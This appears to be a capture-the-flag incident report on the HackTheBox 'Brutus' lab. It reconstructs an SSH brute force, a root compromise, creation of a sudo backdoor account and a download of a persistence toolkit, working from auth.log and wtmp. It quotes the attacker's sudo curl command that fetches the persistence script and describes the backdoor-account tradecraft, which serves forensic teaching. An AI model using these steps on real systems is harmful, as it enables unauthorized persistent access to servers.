# Incident Report — HTB Brutus Sherlock
## SSH Brute Force & Post-Compromise Investigation

---

| Field | Detail |
|---|---|
| **Analyst** | Noel Biju John |
| **Platform** | HackTheBox Sherlock — Brutus |
| **Date** | March 2026 |
| **Artifacts** | `auth.log`, `wtmp` |
| **Severity** | 🔴 High |
| **Status** | Resolved (Simulated Lab) |

---

## I. Executive Summary

A Confluence server was compromised through an automated SSH brute force attack originating from `65.2.161.68`. The attacker obtained valid credentials for the `root` account, established a manual interactive session, created a privileged backdoor account (`cyberjunkie`), and used it to download a Linux persistence toolkit from GitHub. The entire attack chain — from initial brute force through persistence installation — was reconstructed using only two Unix authentication log artifacts: `auth.log` and `wtmp`.

**No EDR. No network capture. No endpoint agent. Pure log forensics.**

---

## II. Background

The target was a Confluence server with an exposed SSH service. Confluence servers are high-value targets due to the sensitive documentation, credentials, and configuration details they typically hold.

The attacker approached the target methodically:

1. Deployed an automated brute force tool to systematically test common credentials against the SSH service
2. Successfully authenticated as `root`
3. Transitioned to a manual interactive session
4. Created a backdoor account with elevated privileges
5. Used the backdoor account to download a Linux persistence toolkit

Each of these actions left traceable records in the authentication logs, forming the basis of this investigation.

---

## III. Artifacts

### auth.log
Plain-text Unix authentication log. Records all authentication-related events including SSH login attempts, PAM session lifecycle events, `sudo` command execution, and user management operations (`useradd`, `usermod`). Each SSH session is assigned a sequential session number that can be used to correlate related events.

### wtmp
Binary log recording interactive login sessions. Cannot be read directly — requires `utmp.py` or the `last` command to parse. Records the username, terminal/PTY assigned, source IP, and session start timestamp in local system time (UTC conversion required).

> **Key distinction:** `auth.log` records the SSH daemon's password acceptance. `wtmp` records the OS-level terminal session establishment. The expected 1-second gap between these two events reflects normal system processing — not a discrepancy.

---

## IV. Investigation Methodology

**Tools used:** `grep`, `sort`, `uniq`, `less`, `utmp.py`

**Approach:** Systematic log traversal in three phases:
1. Establish brute force scope via IP frequency analysis
2. Isolate successful authentication events and classify sessions
3. Trace post-authentication activity via session IDs and sudo logs, correlated with wtmp

---

## V. Investigation — Task by Task

### Task 1 — Identify the Attacker's IP Address

**Command:**
```bash
grep sshd auth.log | grep -v pam_unix | grep -oP '\d{1,3}(\.\d{1,3}){3}' | sort | uniq -c | sort -rn
```

**Output:**
```
165  65.2.161.68
  1  203.101.190.9
  1  172.31.35.28
```

Three IPs returned. `65.2.161.68` appeared **165 times** — overwhelmingly associated with failed SSH authentication attempts. This volume and pattern is characteristic of automated credential stuffing or brute force tooling such as Hydra or Medusa.

![IP Frequency Analysis](../screenshots/ip-frequency.png)
*Figure 1 — IP frequency analysis: `65.2.161.68` identified with 165 failed login attempts*

| | |
|---|---|
| **Attacker IP** | `65.2.161.68` |

---

### Task 2 — Identify the Compromised Account

**Command:**
```bash
grep sshd auth.log | grep "Accepted password" | grep 65.2.161.68
```

**Output:**
```
Mar  6 06:31:40 server sshd[2421]: Accepted password for root from 65.2.161.68 port 34782 ssh2
Mar  6 06:32:44 server sshd[2467]: Accepted password for root from 65.2.161.68 port 53184 ssh2
```

Two successful authentications confirmed for the `root` account. The first (06:31:40) was the automated tool confirming discovered credentials — the session opened and closed within the same second. The second (06:32:44) was the attacker's manual interactive login.

![Root Compromise](../screenshots/root-compromise.png)
*Figure 2 — `Accepted password for root` from attacker IP*

| | |
|---|---|
| **Compromised Account** | `root` |

---

### Task 3 — Identify the Manual Login Timestamp

The `wtmp` binary artifact was parsed to identify when the manual interactive session was established:

**Command:**
```bash
python3 utmp.py wtmp
```

The wtmp output confirmed a root session from `65.2.161.68` established at `2024-03-06 06:32:45 UTC`.

Cross-referencing with auth.log: the password was accepted at `06:32:44` — exactly 1 second earlier. This 1-second gap reflects the system's processing sequence: password accepted by SSH daemon → terminal session spawned by the OS. Both timestamps refer to the same login event.

![wtmp Session](../screenshots/wtmp-session.png)
*Figure 3 — wtmp artifact parsed via `utmp.py` — manual session established at 06:32:45 UTC*

| | |
|---|---|
| **Manual Login Timestamp (UTC)** | `2024-03-06 06:32:45` |

---

### Task 4 — Identify the Attacker's SSH Session Number

**Command:**
```bash
grep "session opened" auth.log | grep 65.2.161.68
```

Two sessions from the attacker IP were identified:

| Session | Behaviour | Classification |
|---|---|---|
| **Session 34** | Opened and closed within the same second (06:31:40) | Automated — brute force tool confirming credentials |
| **Session 37** | Opened at 06:32:44, remained stable | Manual — attacker's interactive working session |

The single-second lifecycle of Session 34 is a reliable indicator of automation. Human operators require several seconds minimum before beginning interaction.

![Sessions](../screenshots/sessions.png)
*Figure 4 — auth.log showing Session 34 (automated) and Session 37 (manual interactive)*

| | |
|---|---|
| **Attacker's Manual Session** | `Session 37` |

---

### Task 5 — Identify the Backdoor Account

**Command:**
```bash
grep "useradd\|usermod" auth.log
```

**Output:**
```
Mar  6 06:34:18 server useradd[2667]: new user: name=cyberjunkie, UID=1002, GID=1002
Mar  6 06:34:31 server usermod[2681]: add 'cyberjunkie' to group 'sudo'
```

Within Session 37, the attacker created a new local user `cyberjunkie` and immediately added it to the `sudo` group. This grants the account full administrative privileges — even if the root password is later changed or root SSH login is disabled, the attacker retains full control via `cyberjunkie`.

![Backdoor Account](../screenshots/backdoor-account.png)
*Figure 5 — `useradd` and `usermod` entries confirming backdoor account creation and sudo escalation*

| | |
|---|---|
| **Backdoor Account** | `cyberjunkie` |
| **Group Added** | `sudo` |

---

### Task 6 — MITRE ATT&CK Persistence Sub-Technique

Creating a local account for persistent access maps to:

| | |
|---|---|
| **MITRE Technique** | `T1136.001 — Create Account: Local Account` |
| **Tactic** | Persistence (TA0003) |

![MITRE T1136](../screenshots/mitre-t1136.png)
*Figure 6 — MITRE ATT&CK framework entry for T1136.001*

---

### Task 7 — Session 37 End Time

**Command:**
```bash
grep "session closed for user root" auth.log
```

**Output:**
```
Mar  6 06:37:24 server sshd[2467]: pam_unix(sshd:session): session closed for user root
```

Session 37 closed at `06:37:24 UTC`. The attacker's interactive root session lasted approximately **4 minutes 39 seconds** — enough time to create the backdoor account and exit before switching to the less conspicuous `cyberjunkie` account.

![Session End](../screenshots/session-end.png)
*Figure 7 — auth.log entry showing Session 37 closed at 06:37:24 UTC*

| | |
|---|---|
| **Session End (UTC)** | `2024-03-06 06:37:24` |
| **Duration** | ~4 minutes 39 seconds |

---

### Task 8 — Persistence Script Download Command

**Command:**
```bash
grep "sudo.*COMMAND" auth.log | grep cyberjunkie
```

**Output:**
```
Mar  6 06:39:14 server sudo[2843]: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ;
COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

After the root session ended, the attacker logged back in as `cyberjunkie` and used `sudo curl` to download `linper.sh` — the Linux Persistence Toolkit by montysecurity. This tool installs multiple persistence mechanisms including cron jobs, SSH key injection, SUID binaries, and shell profile modifications.

Using `curl` (a pre-installed system binary) to download tools is a living-off-the-land technique that avoids triggering process-based detections.

![Linper Download](../screenshots/linper-download.png)
*Figure 8 — sudo COMMAND log entry: `cyberjunkie` downloading `linper.sh` via curl*

| | |
|---|---|
| **Full Command** | `sudo /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh` |

---

## VI. Attack Timeline

| Time (UTC) | Phase | Event |
|---|---|---|
| Prior to 06:31 | 🔴 Brute Force | SSH brute force from `65.2.161.68` — 165+ failed attempts against root |
| **06:31:33** | 🔴 Brute Force | High-volume failures across multiple usernames: root, admin, backup, server_adm |
| **06:31:40** | 🟠 Compromise | Root credentials confirmed — Session 34 opened and closed within same second (automated) |
| **06:32:44** | 🟠 Initial Access | Attacker manually authenticates as root — `Accepted password` (auth.log) |
| **06:32:45** | 🟠 Initial Access | Interactive terminal established — Session 37 opened (wtmp artifact) |
| **06:34:18** | 🔵 Persistence | `useradd`: backdoor account `cyberjunkie` created (UID 1002) |
| **06:34:31** | 🔵 Persistence | `usermod`: `cyberjunkie` added to `sudo` group — full privilege escalation |
| **06:37:24** | 🟡 Lateral Move | Session 37 closed — attacker disconnects from root session |
| **06:39:02** | 🔵 Persistence | Attacker logs back in as `cyberjunkie` |
| **06:39:14** | 🔵 Persistence | `sudo curl` downloads `linper.sh` — multi-layer persistence toolkit installed |

---

## VII. MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| Reconnaissance | Active Scanning | T1595 | 165+ failed SSH attempts indicating systematic scanning |
| Initial Access | Brute Force: Password Guessing | T1110.001 | Automated SSH credential stuffing from `65.2.161.68` |
| Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 | Post-compromise commands via interactive SSH shell |
| Persistence | Create Account: Local Account | T1136.001 | `useradd cyberjunkie` — backdoor account creation |
| Privilege Escalation | Abuse Elevation Control: Sudo | T1548.003 | `usermod -aG sudo cyberjunkie` |
| Defense Evasion | Use Alternate Authentication Material | T1550 | Pivoting from root to cyberjunkie avoids root exposure |
| Command & Control | Ingress Tool Transfer | T1105 | `sudo curl` downloads `linper.sh` from external GitHub URL |

---

## VIII. Indicators of Compromise (IOCs)

| Indicator | Value |
|---|---|
| **Attacker IP** | `65.2.161.68` |
| **Target Service** | SSH (port 22) — Confluence server |
| **Compromised Account** | `root` |
| **Backdoor Account** | `cyberjunkie` (UID 1002, sudo group) |
| **Automated Session** | Session 34 — opened/closed same second (06:31:40) |
| **Manual Session** | Session 37 — 06:32:45 to 06:37:24 UTC |
| **Session Duration** | ~4 minutes 39 seconds |
| **Persistence Script** | `linper.sh` — Linux Persistence Toolkit (montysecurity) |
| **Script URL** | `https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh` |
| **Download Method** | `sudo /usr/bin/curl <url>` |
| **MITRE Persistence** | T1136.001 |

---

## IX. Key Analytical Findings

### Session Timing as an Automation Indicator
Session 34 opened and closed within the same second — a near-certain indicator of automated tooling. Human operators require several seconds minimum before interacting. This single data point enabled confident separation of the automated brute force phase from the manual exploitation phase.

### auth.log + wtmp Correlation
`auth.log` records the SSH daemon's perspective (password accepted). `wtmp` records the OS's perspective (terminal spawned). The 1-second gap between `06:32:44` and `06:32:45` is expected processing latency — not a discrepancy. Using both artifacts together provides timeline precision that neither artifact alone can achieve.

### Backdoor Account Strategy
The attacker did not rely solely on the compromised root account. Creating `cyberjunkie` with sudo privileges ensures persistent access even if:
- The root password is rotated
- Root SSH login is disabled
- The original intrusion is detected and partially remediated

### Living Off the Land
Using `curl` — a pre-installed system binary — to download `linper.sh` avoids introducing new executables that could trigger process-based detections. This is a standard post-compromise tradecraft technique.

---

## X. Severity Assessment

**Classification: 🔴 High Severity**

| Factor | Assessment |
|---|---|
| Access level achieved | Root (full system compromise) |
| Persistence established | Yes — privileged backdoor account + persistence toolkit |
| Data exposure | Potential — Confluence server content at risk |
| Detection difficulty | Medium — detectable via log analysis but requires active monitoring |
| Remediation complexity | High — multi-layer persistence requires full system audit |

---

## XI. Defensive Recommendations

| Priority | Recommendation |
|---|---|
| 🔴 Critical | **Disable root SSH login** — set `PermitRootLogin no` in `/etc/ssh/sshd_config` |
| 🔴 Critical | **Enforce key-based authentication** — disable password auth entirely for SSH |
| 🟠 High | **Deploy Fail2Ban** — auto-block IPs after ≥5 failed login attempts |
| 🟠 High | **Alert on `useradd` / `usermod`** — any new account creation on production servers |
| 🟠 High | **Monitor sudo COMMAND logs** — flag `curl`, `wget`, `bash` executed with elevated privileges |
| 🟡 Medium | **Restrict outbound connections** — block egress to `raw.githubusercontent.com` from servers |
| 🟡 Medium | **Implement SSH login alerts** — notify on successful root authentication regardless of source |

---

## XII. Investigative Limitations

- No network capture available — cannot confirm exact brute force tool used
- No process audit logs (`auditd`) — commands executed during Session 37 are only partially visible via sudo logs
- `wtmp` timestamps are in local system time — UTC conversion required and offset must be confirmed
- `linper.sh` execution is not confirmed — only the download command is evidenced

---

## XIII. Conclusion

This investigation reconstructed a complete SSH brute force attack and post-compromise activity chain using only `auth.log` and `wtmp` — two standard Unix authentication artifacts available on any Linux system. Every conclusion is supported by specific log entries with timestamps and session identifiers.

The rapid compromise of the root account underscores the critical risk of exposing SSH on a production server with password-based authentication. The attacker achieved full administrative control within minutes of initiating the brute force, created a privileged backdoor account, and downloaded a multi-mechanism persistence toolkit — all within a 7-minute window.

From a defensive standpoint, **every stage of this attack was detectable** through standard logging:
- The brute force was visible in failed login volume
- The successful authentication was an immediate alert opportunity
- The `useradd` and `usermod` events should trigger on any hardened system
- The `sudo curl` to an external URL is a detectable egress pattern

This investigation demonstrates that effective incident response does not always require sophisticated tooling — it requires the ability to read, correlate, and reason from log evidence systematically.
